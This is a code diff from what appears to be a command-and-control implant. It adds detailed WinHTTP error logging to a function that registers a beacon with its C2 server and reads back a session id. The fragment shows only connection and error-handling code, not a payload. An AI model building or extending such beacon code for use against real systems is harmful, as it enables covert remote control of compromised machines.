@@ -159,6 +159,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     if (!hSession)
     {
         // not really alot we can do about this, guess we just return and try again later...
+        DEBUG("FAILED: WinHttpOpen, GetLastError(): %d", GetLastError());
         return FALSE;
     }
 
@@ -171,6 +172,8 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     if (!hConnect)
     {
         rWinHttpCloseHandle(hSession);
+
+        DEBUG("FAILED: WinHttpConnect, GetLastError(): %d", GetLastError());
 
         return FALSE;
     }
@@ -186,6 +189,8 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
         rWinHttpCloseHandle(hSession);
         rWinHttpCloseHandle(hConnect);
 
+        DEBUG("FAILED: WinHttpOpenRequest, GetLastError(): %d", GetLastError());
+
         return FALSE;
     }
 
@@ -200,6 +205,8 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
         rWinHttpCloseHandle(hRequest);
         rWinHttpCloseHandle(hSession);
         rWinHttpCloseHandle(hConnect);
+
+        DEBUG("FAILED: WinHttpSetOption, GetLastError(): %d", GetLastError());
 
         return FALSE;
     }
@@ -219,10 +226,10 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     } else {
         if (GetLastError() & ERROR_WINHTTP_SECURE_FAILURE)
         {
-            DEBUG("Failed to make callback");
+            DEBUG("FAILED: WinHttpSendRequest (ERROR_WINHTTP_SECURE_FAILURE)");
         }
 
-        DEBUG("WinHttpSendRequest error: %d\n", GetLastError());
+        DEBUG("FAILED: WinHttpSendRequest, GetLastError(): %d", GetLastError());
     }
 
     // no lets get the session id
@@ -235,7 +242,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
             if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
             {
                 // Theres no data avalible
-                DEBUG("WinHttpQueryDataAvailable error\n");
+                DEBUG("FAILED: WinHttpQueryDataAvailable, GetLastError(): %d", GetLastError());
                 return FALSE;
             }
 
@@ -245,7 +252,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
             if (!rWinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
             {
                 // been an error
-                DEBUG("WinHttpReadData error\n");
+                DEBUG("FAILED: WinHttpReadData, GetLastError(): %d", GetLastError());
                 return FALSE;
             }
 
